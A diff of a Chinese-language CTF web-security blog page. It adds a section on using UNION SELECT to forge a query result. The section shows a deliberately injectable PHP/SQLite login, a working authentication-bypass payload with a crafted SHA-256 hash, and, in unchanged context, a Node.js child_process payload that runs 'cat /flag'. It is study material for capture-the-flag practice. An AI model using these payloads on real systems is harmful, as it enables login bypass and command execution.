@@ -54,8 +54,9 @@
 <meta property="og:image" content="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/04/1-5-1024x792.png">
 <meta property="og:image" content="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/04/1-6.png">
 <meta property="og:image" content="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/04/1-7-1024x565.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20250109213744023.png">
 <meta property="article:published_time" content="2024-12-24T13:01:07.000Z">
-<meta property="article:modified_time" content="2025-01-04T09:35:42.742Z">
+<meta property="article:modified_time" content="2025-01-09T14:01:39.281Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
@@ -488,6 +489,8 @@
 <li><blockquote>
 <p>注意:要保持原本的格式，base64后的&#x2F;9j&#x2F;不可少，只是将jpg改为php</p>
 </blockquote>
+</li>
+<li><p>如果用curl传参post，注意如果有<code>$</code>符号需要转义，否则命令行会错误解析为开头。</p>
 </li>
 </ul>
 </li>
@@ -1178,6 +1181,19 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat /flag&#x27;</span>).<span class="title function_">toString</span>()<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 
 <p>最后的注释符用于将后续代码<strong>注释</strong>，防止干扰执行。</p>
+<h2 id="联合注入的另一种用法"><a href="#联合注入的另一种用法" class="headerlink" title="联合注入的另一种用法"></a>联合注入的另一种用法</h2><p>union select本质上是<strong>增加了结果集</strong>。</p>
+<p>因此如果无法构造<code>union select</code>执行直接执行查询时，可以直接增加一个查询结果，再构造对应的其他参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]) &amp;&amp; (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>])) &amp;&amp; (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]))) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_trying_to_hak_me</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;why u bully me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;/var/db.sqlite&quot;</span>); </span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>);       <span class="comment">#   &lt;======注入点</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;pls dont break me&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="variable">$split</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;$&#x27;</span>, <span class="variable">$result</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">        <span class="variable">$password_hash</span> = <span class="variable">$split</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$salt</span> = <span class="variable">$split</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$password_hash</span> === <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$pass</span>.<span class="variable">$salt</span>)) <span class="variable">$logged_in</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable">$err</span> = <span class="string">&quot;Wrong password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$err</span> = <span class="string">&quot;No such user&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为被过滤，无法执行执行盲注或者直接查询，可以查询一个不存在的字段，再直接<strong>构造一个结果</strong>，例如：</p>
+<p><img src="/../images/image-20250109213744023.png" alt="image-20250109213744023"></p>
+<p>例如上题的payload为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=a<span class="string">&#x27;union select 1,&#x27;</span>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="variable">$456</span><span class="string">&#x27;--+&amp;pass=123</span></span><br></pre></td></tr></table></figure>
+
+<p>其中中间的哈希值为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(“sha256”, <span class="string">&quot;123&quot;</span>.<span class="string">&quot;456&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>的结果</p>
 
         
       </div>
